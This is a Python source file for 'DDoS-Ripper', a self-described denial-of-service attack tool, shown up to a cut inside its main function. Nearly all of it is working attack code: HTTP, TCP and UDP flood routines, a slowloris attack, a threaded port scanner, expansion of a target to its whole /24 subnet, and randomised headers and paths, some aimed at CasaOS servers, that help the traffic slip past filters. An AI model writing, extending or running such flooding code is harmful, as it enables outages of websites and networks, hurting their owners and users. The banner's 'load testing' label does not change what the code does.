#!/usr/bin/env python3
"""
DDoS-Ripper - Distributable Denied-of-Service (DDOS) attack server
Cuts off targets or surrounding infrastructure in a flood of Internet traffic
"""

import socket
import random
import threading
import time
import sys
import ssl
import ipaddress
from urllib.parse import urlparse
from collections import defaultdict


def print_banner():
    """Print ASCII art banner"""
    banner = """
    ================================================================================
    
     ██████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗██████╗ 
     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██║██╔══██╗
     ██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝█████╗  ██████╔╝    ██████╔╝██║██████╔╝
     ██║  ██║██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ██╔══██╗██║██╔═══╝ 
     ██████╔╝██║  ██║╚██████╔╝██████╔╝██║  ██║███████╗██║  ██║    ██║  ██║██║██║     
     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚═╝     
    
    ================================================================================
    
     [*] Distributable Denied-of-Service Attack Tool
     [*] High-Performance Load Testing & Stress Testing
     [*] Port Scanning & Multi-Port Attack Capabilities
     [*] Thread-Based Socket-Level HTTP Flooding
    
    ================================================================================
    """
    print(banner)


def get_associated_ips(ip_address, subnet_mask=24):
    """Get all IPs in the same subnet as the target IP"""
    try:
        # Parse the IP address
        ip = ipaddress.IPv4Address(ip_address)
        # Create network with specified subnet mask
        network = ipaddress.IPv4Network(f"{ip}/{subnet_mask}", strict=False)
        # Get all hosts in the network
        hosts = list(network.hosts())
        return [str(host) for host in hosts]
    except:
        # If IP parsing fails, return just the original IP
        return [ip_address]


class PortScanner:
    """Port scanner to detect open ports"""
    
    def __init__(self, host, timeout=3.0, retries=2):
        self.host = host
        self.timeout = timeout
        self.retries = retries
        self.open_ports = []
        self.lock = threading.Lock()
    
    def check_host_reachable(self):
        """Check if host is reachable"""
        try:
            # Try to resolve hostname first
            socket.gethostbyname(self.host)
            
            # Try to connect to a common port to verify reachability
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(2.0)
            # Try port 80 (HTTP) first
            result = test_sock.connect_ex((self.host, 80))
            test_sock.close()
            
            # If we can connect or get connection refused, host is reachable
            # (connection refused means host is up but port is closed)
            return True
        except socket.gaierror:
            print(f"⚠️  Warning: Could not resolve hostname {self.host}")
            return False
        except:
            # If we can't connect, still try scanning (might be filtered)
            return True
    
    def scan_port(self, port, retry=True):
        """Scan a single port with retry logic"""
        max_attempts = self.retries + 1 if retry else 1
        
        for attempt in range(max_attempts):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                
                # Set socket options for better connection
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Try to connect
                result = sock.connect_ex((self.host, port))
                
                # Close socket immediately
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                sock.close()
                
                if result == 0:
                    return True
                
                # Connection refused (111) means port is closed, not filtered
                # But we'll still retry in case of transient issues
                if result == 111 and attempt < max_attempts - 1:
                    time.sleep(0.2)
                    continue
                
                # Other error codes might indicate filtered ports
                # But we'll still try again
                if attempt < max_attempts - 1:
                    time.sleep(0.2)
                    continue
                    
            except socket.timeout:
                # Timeout might mean port is filtered, try again
                if attempt < max_attempts - 1:
                    time.sleep(0.2)
                    continue
            except ConnectionRefusedError:
                # Port is closed, not open
                return False
            except Exception as e:
                # Other errors, try again
                if attempt < max_attempts - 1:
                    time.sleep(0.2)
                    continue
                break
        
        return False
    
    def scan_range(self, start_port=1, end_port=65535, max_threads=100):
        """Scan a range of ports"""
        print(f"\n🔍 Scanning ports {start_port}-{end_port} on {self.host}...")
        print(f"   Timeout: {self.timeout}s per port, Retries: {self.retries}")
        print("This may take a while. Please wait...\n")
        
        # Check if host is reachable first
        if not self.check_host_reachable():
            print("⚠️  Host may not be reachable, but continuing scan...\n")
        
        self.open_ports = []
        ports_to_scan = list(range(start_port, end_port + 1))
        total_ports = len(ports_to_scan)
        scanned = 0
        
        def scan_worker():
            nonlocal scanned
            while True:
                with self.lock:
                    if not ports_to_scan:
                        break
                    port = ports_to_scan.pop(0)
                    scanned += 1
                
                if self.scan_port(port):
                    with self.lock:
                        if port not in self.open_ports:
                            self.open_ports.append(port)
                    print(f"  ✓ Port {port} is OPEN", flush=True)
                
                if scanned % 100 == 0:
                    progress = (scanned / total_ports) * 100
                    print(f"  Progress: {scanned}/{total_ports} ({progress:.1f}%) - Found: {len(self.open_ports)}", end='\r', flush=True)
        
        threads = []
        for _ in range(min(max_threads, total_ports)):
            thread = threading.Thread(target=scan_worker, daemon=True)
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        print(f"\n\n✅ Scan complete! Found {len(self.open_ports)} open port(s)")
        if self.open_ports:
            print(f"   Open ports: {', '.join(map(str, sorted(self.open_ports)))}")
        return sorted(self.open_ports)
    
    def scan_common_ports(self, silent=False):
        """Scan common ports with improved detection"""
        common_ports = [
            # Web servers
            80, 443, 8080, 8443, 8888, 9000, 9090, 8000, 8001, 8880,
            # SSH/Telnet
            22, 23,
            # FTP
            21, 2121,
            # Email
            25, 110, 143, 993, 995, 587, 465,
            # DNS
            53,
            # Windows
            135, 139, 445, 3389, 5985, 5986,
            # Database
            3306, 5432, 1433, 27017, 6379,
            # Other common
            111, 1723, 5900, 8081, 8082, 8444, 9001, 3000, 5000, 7000, 8008
        ]
        
        # Remove duplicates while preserving order
        common_ports = list(dict.fromkeys(common_ports))
        
        if not silent:
            print(f"\n🔍 Scanning common ports on {self.host}...")
            print(f"   Timeout: {self.timeout}s per port, Retries: {self.retries}")
            print()
        
        # Check if host is reachable first
        if not self.check_host_reachable():
            if not silent:
                print("⚠️  Host may not be reachable, but continuing scan...\n")
        
        self.open_ports = []
        total = len(common_ports)
        
        for i, port in enumerate(common_ports, 1):
            if not silent:
                print(f"  Scanning port {port} ({i}/{total})...", end='\r', flush=True)
            
            if self.scan_port(port):
                with self.lock:
                    if port not in self.open_ports:
                        self.open_ports.append(port)
                if not silent:
                    print(f"  ✓ Port {port} is OPEN" + " " * 20)
        
        if not silent:
            print(f"\n✅ Scan complete! Found {len(self.open_ports)} open port(s)")
            if self.open_ports:
                print(f"   Open ports: {', '.join(map(str, sorted(self.open_ports)))}")
        
        return sorted(self.open_ports)
    
    def scan_all_ports(self, max_threads=100):
        """Scan all ports (1-65535)"""
        return self.scan_range(1, 65535, max_threads)


class DRipper:
    def __init__(self, target, threads=135, port=None, skip_test=False, intensity=1, protocol='http'):
        self.target = target
        self.threads = threads
        self.port = port
        self.running = True
        self.skip_test = skip_test
        self.intensity = intensity  # Intensity multiplier (1 = normal, 2+ = more intense)
        self.protocol = protocol.lower()  # http, tcp, or udp
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'errors': defaultdict(int)
        }
        self.lock = threading.Lock()
        
        # Parse target URL
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        parsed = urlparse(target)
        self.host = parsed.hostname or parsed.path.split('/')[0]
        self.port = port or parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        self.scheme = parsed.scheme or 'http'
        self.is_https = self.scheme == 'https'
        
        # User agents pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
            'curl/7.68.0',
            'PostmanRuntime/7.28.0',
            'python-requests/2.28.0'
        ]
        
        # Load headers from file if exists
        self.headers = self.load_headers()
    
    def load_headers(self):
        """Load custom headers from headers.txt if available"""
        headers = {}
        try:
            with open('headers.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
        except FileNotFoundError:
            pass
        return headers
    
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def get_random_path(self):
        """Get random path with query parameters"""
        paths = [
            self.path,
            self.path + '?id=' + str(random.randint(1, 10000)),
            self.path + '?page=' + str(random.randint(1, 1000)),
            self.path + '?search=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15))),
            self.path + '?q=' + ''.join(random.choices('0123456789abcdef', k=random.randint(10, 32))),
            '/api/v1/users',
            '/api/v1/data',
            '/admin',
            '/login',
            '/dashboard',
            '/api/status',
            '/api/health',
            '/v1/endpoint',
            '/api/v2/users',
            '/api/v2/data',
            # CasaOS specific paths
            '/v1/apps',
            '/v1/containers',
            '/v1/system',
            '/v1/storage',
            '/v1/network',
            '/v1/users',
            '/v1/settings',
            '/api/apps',
            '/api/containers',
            '/api/system',
            '/api/storage',
            '/api/network',
            '/api/users',
            '/api/settings',
            '/apps',
            '/containers',
            '/system',
            '/storage',
            '/network',
            '/settings',
            '/api/v1/apps',
            '/api/v1/containers',
            '/api/v1/system',
            '/api/v1/storage',
            '/api/v1/network',
            '/api/v1/users',
            '/api/v1/settings',
        ]
        return random.choice(paths)
    
    def get_random_method(self):
        """Get random HTTP method"""
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        return random.choice(methods)
    
    def get_random_payload(self):
        """Generate random POST/PUT payload"""
        payload_types = [
            # JSON payloads
            '{"id":' + str(random.randint(1, 999999)) + ',"data":"' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(100, 1000))) + '"}',
            # Form data
            'username=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 50))) + '&password=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10, 50))),
            # Large random data
            ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(500, 2000))),
            # XML-like
            '<data><id>' + str(random.randint(1, 999999)) + '</id><content>' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(200, 800))) + '</content></data>',
        ]
        return random.choice(payload_types)
    
    def build_http_request(self, path=None, host=None):
        """Build HTTP request"""
        if path is None:
            path = self.get_random_path()
        if host is None:
            host = self.host
        
        user_agent = self.get_random_user_agent()
        
        # Build headers
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Pragma': 'no-cache'
        }
        
        # Merge with custom headers
        headers.update(self.headers)
        
        # Build request
        request = f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        
        request += "\r\n"
        return request.encode()
    
    def http_attack(self, target_port=None, target_host=None):
        """HTTP DDoS attack - multiple requests per connection with various methods"""
        port = target_port or self.port
        host = target_host or self.host
        use_https = port in [443, 8443] or self.is_https
        
        # Pre-build base request components for speed
        user_agents = self.user_agents
        
        while self.running:
            sock = None
            try:
                # Create socket with optimized settings
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)  # Ultra-short timeout for maximum intensity
                
                # Optimize socket for speed
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle's algorithm
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Connect with short timeout
                sock.connect((host, port))
                
                # Wrap with SSL if HTTPS
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                # Send multiple requests per connection (HTTP pipelining) for maximum intensity
                # Intensity multiplier increases requests per connection
                base_requests = random.randint(5, 12)
                num_requests = base_requests * self.intensity  # Scale with intensity
                
                for _ in range(num_requests):
                    try:
                        method = self.get_random_method()
                        path = self.get_random_path()
                        user_agent = random.choice(user_agents)
                        
                        # Build request based on method
                        if method in ['POST', 'PUT', 'PATCH']:
                            payload = self.get_random_payload()
                            content_length = len(payload.encode())
                            request = f"{method} {path} HTTP/1.1\r\n"
                            request += f"Host: {host}\r\n"
                            request += f"User-Agent: {user_agent}\r\n"
                            request += f"Accept: */*\r\n"
                            request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                            request += f"Content-Length: {content_length}\r\n"
                            request += f"Connection: keep-alive\r\n"
                            request += f"\r\n{payload}\r\n"
                        else:
                            # GET, HEAD, DELETE, OPTIONS
                            request = f"{method} {path} HTTP/1.1\r\n"
                            request += f"Host: {host}\r\n"
                            request += f"User-Agent: {user_agent}\r\n"
                            request += f"Accept: */*\r\n"
                            request += f"Connection: keep-alive\r\n"
                            request += f"\r\n"
                        
                        sock.sendall(request.encode())
                        
                        # Count each request as success
                        with self.lock:
                            self.stats['total'] += 1
                            self.stats['success'] += 1
                        
                        # Small delay between pipelined requests (optional, can remove for even more intensity)
                        # time.sleep(0.001)  # 1ms delay
                        
                    except:
                        # If one request fails, continue with next
                        with self.lock:
                            self.stats['total'] += 1
                            self.stats['failed'] += 1
                        break
                
                # Close socket after sending all requests
                try:
                    sock.shutdown(socket.SHUT_WR)
                except:
                    pass
                sock.close()
                
            except (socket.timeout, TimeoutError):
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['timeout'] += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError):
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['connection_refused'] += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            except OSError as e:
                # Handle common OSErrors quickly
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    error_msg = f"OSError_{e.errno}"
                    self.stats['errors'][error_msg] = self.stats['errors'].get(error_msg, 0) + 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            except Exception:
                # Catch all other errors quickly
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    def tcp_attack(self, target_port=None, target_host=None):
        """Raw TCP flood attack - opens connections and sends random data"""
        port = target_port or self.port
        host = target_host or self.host
        
        # Generate random data payloads for TCP flood
        payloads = [
            b'\x00' * random.randint(100, 1000),
            b'\xFF' * random.randint(100, 1000),
            ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(100, 2000))).encode(),
            b'GET / HTTP/1.1\r\n' + b'X' * random.randint(500, 2000),
            b'POST / HTTP/1.1\r\n' + b'Y' * random.randint(500, 2000),
        ]
        
        while self.running:
            sock = None
            try:
                # Create socket with optimized settings
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)  # Ultra-short timeout
                
                # Optimize socket for speed
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Connect
                sock.connect((host, port))
                
                # Send multiple payloads per connection (intensity-based)
                num_sends = random.randint(3, 8) * self.intensity
                for _ in range(num_sends):
                    try:
                        payload = random.choice(payloads)
                        sock.sendall(payload)
                        
                        with self.lock:
                            self.stats['total'] += 1
                            self.stats['success'] += 1
                    except:
                        with self.lock:
                            self.stats['total'] += 1
                            self.stats['failed'] += 1
                        break
                
                # Close socket
                try:
                    sock.shutdown(socket.SHUT_WR)
                except:
                    pass
                sock.close()
                
            except (socket.timeout, TimeoutError):
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['timeout'] += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError):
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['connection_refused'] += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            except OSError as e:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    error_msg = f"OSError_{e.errno}"
                    self.stats['errors'][error_msg] = self.stats['errors'].get(error_msg, 0) + 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            except Exception:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    def udp_attack(self, target_port=None, target_host=None):
        """UDP flood attack - sends UDP packets with random data"""
        port = target_port or self.port
        host = target_host or self.host
        
        # Generate random UDP payloads
        payloads = [
            b'\x00' * random.randint(64, 512),
            b'\xFF' * random.randint(64, 512),
            ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(64, 1024))).encode(),
            b'GET / HTTP/1.1\r\n' + b'X' * random.randint(200, 1000),
            b'POST / HTTP/1.1\r\n' + b'Y' * random.randint(200, 1000),
            b'\x00\x01\x02\x03' * random.randint(16, 256),
        ]
        
        while self.running:
            try:
                # Create UDP socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)  # Very short timeout for UDP
                
                # Send multiple packets (intensity-based)
                num_packets = random.randint(5, 15) * self.intensity
                for _ in range(num_packets):
                    try:
                        payload = random.choice(payloads)
                        sock.sendto(payload, (host, port))
                        
                        with self.lock:
                            self.stats['total'] += 1
                            self.stats['success'] += 1
                    except:
                        with self.lock:
                            self.stats['total'] += 1
                            self.stats['failed'] += 1
                
                sock.close()
                
            except (socket.timeout, TimeoutError):
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['timeout'] += 1
            except OSError as e:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    error_msg = f"OSError_{e.errno}"
                    self.stats['errors'][error_msg] = self.stats['errors'].get(error_msg, 0) + 1
            except Exception:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
    
    def attack(self, target_port=None, target_host=None):
        """Main attack dispatcher - routes to appropriate attack method based on protocol"""
        if self.protocol == 'tcp':
            self.tcp_attack(target_port, target_host)
        elif self.protocol == 'udp':
            self.udp_attack(target_port, target_host)
        else:  # http (default)
            self.http_attack(target_port, target_host)
    
    def slowloris_attack(self, target_port=None, target_host=None):
        """Slowloris attack - keeps connections open"""
        port = target_port or self.port
        host = target_host or self.host
        use_https = port in [443, 8443] or self.is_https
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((host, port))
                
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                # Send partial request
                request = f"GET {self.path} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += f"User-Agent: {self.get_random_user_agent()}\r\n"
                request += f"Content-Length: {random.randint(1000, 10000)}\r\n"
                
                sock.sendall(request.encode())
                
                # Keep connection alive
                start_time = time.time()
                while self.running and (time.time() - start_time) < 300:  # 5 minutes max
                    try:
                        sock.sendall(b"X-a: b\r\n")
                        time.sleep(10)
                    except:
                        break
                
                sock.close()
                
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['success'] += 1
                    
            except Exception as e:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    error_type = type(e).__name__
                    self.stats['errors'][error_type] += 1
    
    def test_connection(self, target_port=None, target_host=None, quick=False):
        """Test if we can connect to the target"""
        port = target_port or self.port
        host = target_host or self.host
        use_https = port in [443, 8443] or self.is_https
        
        if not quick:
            print(f"\n🔍 Testing connection to {host}:{port}...")
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2 if quick else 3)  # Faster timeout for quick test
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((host, port))
            
            if use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Try to send a simple request
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            sock.sendall(request.encode())
            
            # Try to receive response (quick)
            sock.settimeout(1)
            try:
                response = sock.recv(4096)
                if response and not quick:
                    print(f"✅ Connection successful! Port {port} is open and responding.")
                    print(f"   Response preview: {response[:100].decode('utf-8', errors='ignore')[:50]}...")
                    return True
                elif not quick:
                    print(f"⚠️  Connection established but no response received. Port {port} may be open but not HTTP.")
                    return True
                else:
                    return True
            except socket.timeout:
                if not quick:
                    print(f"⚠️  Connection established but timeout waiting for response. Port {port} is open.")
                return True
            except Exception:
                if not quick:
                    print(f"⚠️  Connection established but error receiving response.")
                return True
        except socket.timeout:
            if not quick:
                print(f"❌ Connection timeout! Port {port} may be filtered or not responding.")
            return False
        except ConnectionRefusedError:
            if not quick:
                print(f"❌ Connection refused! Port {port} is closed or not accepting connections.")
            return False
        except OSError as e:
            if not quick:
                print(f"❌ Connection error (OSError {e.errno}): {e}")
            return False
        except Exception as e:
            if not quick:
                print(f"❌ Connection failed: {type(e).__name__}: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    def stats_printer(self):
        """Print real-time statistics"""
        start_time = time.time()
        last_error_print = 0
        while self.running:
            time.sleep(1)
            duration = time.time() - start_time
            with self.lock:
                total = self.stats['total']
                success = self.stats['success']
                failed = self.stats['failed']
                rps = total / duration if duration > 0 else 0
                errors = self.stats['errors']
                
                # Show error details every 5 seconds if there are failures
                error_info = ""
                if failed > 0 and time.time() - last_error_print > 5:
                    top_errors = sorted(errors.items(), key=lambda x: x[1], reverse=True)[:3]
                    if top_errors:
                        error_info = f" | Top errors: {', '.join([f'{k}({v})' for k, v in top_errors])}"
                        last_error_print = time.time()
                
                print(f"\r[ATTACK] Total: {total} | Success: {success} | Failed: {failed} | RPS: {rps:.1f}{error_info}", end='', flush=True)
    
    def run(self, mode='flood', ports=None, targets=None):
        """Run the attack"""
        if targets:
            # Multi-IP, multi-port attack
            print("\n" + "=" * 70)
            print("🔥 DDoS-Ripper - Multi-IP Multi-Port Attack")
            print("=" * 70)
            print(f"Targets:        {len(targets)} IP(s)")
            print(f"Ports per IP:   {', '.join(map(str, ports)) if ports else 'All detected'}")
            print(f"Threads:        {self.threads} per port per IP")
            print(f"Protocol:       {self.protocol.upper()}")
            print(f"Mode:           {mode.upper()}")
            print("-" * 70)
            print("Starting multi-IP multi-port attack... Press Ctrl+C to stop")
            print("-" * 70)
            
            # Start stats printer
            stats_thread = threading.Thread(target=self.stats_printer, daemon=True)
            stats_thread.start()
            
            # Start attack threads for each IP and port
            threads = []
            attack_func = self.slowloris_attack if mode == 'slowloris' else self.attack
            
            for target_ip, target_ports in targets.items():
                for port in target_ports:
                    for i in range(self.threads):
                        def attack_worker(ip, p):
                            while self.running:
                                if mode == 'slowloris':
                                    self.slowloris_attack(p, ip)
                                else:
                                    self.attack(p, ip)
                        
                        thread = threading.Thread(target=attack_worker, args=(target_ip, port), daemon=True)
                        thread.start()
                        threads.append(thread)
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\n⚠️  Attack stopped by user")
                self.running = False
                time.sleep(1)
                self.print_stats()
        elif ports:
            # Multi-port attack
            total_ports = len(ports)
            total_threads = self.threads * total_ports
            
            print("\n" + "=" * 70)
            print("🔥 DDoS-Ripper - Multi-Port Attack")
            print("=" * 70)
            print(f"Target:         {self.host}")
            if total_ports <= 20:
                print(f"Ports:          {', '.join(map(str, ports))}")
            else:
                print(f"Ports:          {total_ports} ports ({ports[0]}-{ports[-1]})")
            print(f"Threads:        {self.threads} per port")
            print(f"Total Threads:  {total_threads:,}")
            print(f"Protocol:       {self.protocol.upper()}")
            print(f"Mode:           {mode.upper()}")
            print("-" * 70)
            print("Starting multi-port attack... Press Ctrl+C to stop")
            print("-" * 70)
            
            # Start stats printer
            stats_thread = threading.Thread(target=self.stats_printer, daemon=True)
            stats_thread.start()
            
            # Start attack threads for each port
            # For very large port ranges, use a more efficient approach
            threads = []
            attack_func = self.slowloris_attack if mode == 'slowloris' else self.attack
            
            if total_ports > 10000:
                # For very large port ranges, use a worker pool approach
                print(f"   Using optimized attack mode for {total_ports:,} ports...")
                print(f"   Creating {min(self.threads * 100, 10000):,} worker threads...")
                
                def port_attack_worker():
                    """Worker that attacks random ports from the list"""
                    while self.running:
                        port = random.choice(ports)
                        try:
                            if mode == 'slowloris':
                                self.slowloris_attack(port)
                            else:
                                self.attack(port)
                        except:
                            pass
                
                # Create worker threads that attack random ports
                # This is more efficient than one thread per port for large ranges
                optimal_threads = min(self.threads * 100, 10000)  # Cap at 10k threads
                for i in range(optimal_threads):
                    thread = threading.Thread(target=port_attack_worker, daemon=True)
                    thread.start()
                    threads.append(thread)
            else:
                # For smaller port ranges, attack each port with dedicated threads
                for port in ports:
                    for i in range(self.threads):
                        thread = threading.Thread(target=attack_func, args=(port,), daemon=True)
                        thread.start()
                        threads.append(thread)
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\n⚠️  Attack stopped by user")
                self.running = False
                time.sleep(1)
                self.print_stats()
        else:
            # Single port attack
            # Test connection first (unless skipped)
            if not self.skip_test:
                if not self.test_connection():
                    print("\n⚠️  WARNING: Connection test failed! The attack may not work.")
                    print("   Continuing anyway... (Press Ctrl+C to stop)")
                    time.sleep(1)
            
            print("\n" + "=" * 70)
            print("🔥 DDoS-Ripper - Distributable Denied-of-Service Attack")
            print("=" * 70)
            print(f"Target:         {self.host}:{self.port}")
            if self.protocol == 'http':
                print(f"Path:           {self.path}")
                print(f"Scheme:         {self.scheme.upper()}")
            print(f"Protocol:       {self.protocol.upper()}")
            print(f"Threads:        {self.threads}")
            print(f"Mode:           {mode.upper()}")
            print("-" * 70)
            print("Starting attack... Press Ctrl+C to stop")
            print("-" * 70)
            
            # Start stats printer
            stats_thread = threading.Thread(target=self.stats_printer, daemon=True)
            stats_thread.start()
            
            # Start attack threads
            threads = []
            attack_func = self.slowloris_attack if mode == 'slowloris' else self.attack
            
            for i in range(self.threads):
                thread = threading.Thread(target=attack_func, daemon=True)
                thread.start()
                threads.append(thread)
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\n⚠️  Attack stopped by user")
                self.running = False
                time.sleep(1)
                self.print_stats()
    
    def print_stats(self):
        """Print final statistics"""
        duration = time.time() - (getattr(self, 'start_time', time.time()))
        total = self.stats['total']
        success = self.stats['success']
        failed = self.stats['failed']
        
        print("\n" + "=" * 70)
        print("📊 ATTACK STATISTICS")
        print("=" * 70)
        print(f"Total Requests:  {total:,}")
        print(f"Successful:      {success:,} ({success/total*100:.1f}%)" if total > 0 else "Successful:      0")
        print(f"Failed:          {failed:,} ({failed/total*100:.1f}%)" if total > 0 else "Failed:          0")
        
        if self.stats['errors']:
            print("\nErrors:")
            for error_type, count in self.stats['errors'].items():
                print(f"  {error_type}: {count:,}")
        
        print("=" * 70 + "\n")


def select_ports(open_ports):
    """Interactive port selection"""
    if not open_ports:
        print("❌ No open ports found!")
        return []
    
    print("\n" + "=" * 70)
    print("📋 Open Ports Detected")
    print("=" * 70)
    for i, port in enumerate(open_ports, 1):
        print(f"  {i}. Port {port}")
    print("=" * 70)
    
    print("\nSelect ports to attack:")
    print("  - Enter port numbers separated by commas (e.g., 80,443,8080)")
    print("  - Enter 'all' to attack all detected ports")
    print("  - Enter 'q' to quit")
    
    while True:
        choice = input("\nYour choice: ").strip().lower()
        
        if choice == 'q':
            return []
        
        if choice == 'all':
            return open_ports
        
        try:
            selected = [int(p.strip()) for p in choice.split(',')]
            valid_ports = [p for p in selected if p in open_ports]
            if valid_ports:
                return valid_ports
            else:
                print("❌ No valid ports selected. Please try again.")
        except ValueError:
            print("❌ Invalid input. Please enter port numbers separated by commas.")


def main():
    import argparse
    
    # Print banner
    print_banner()
    time.sleep(0.5)  # Small delay for aesthetic effect
    
    parser = argparse.ArgumentParser(
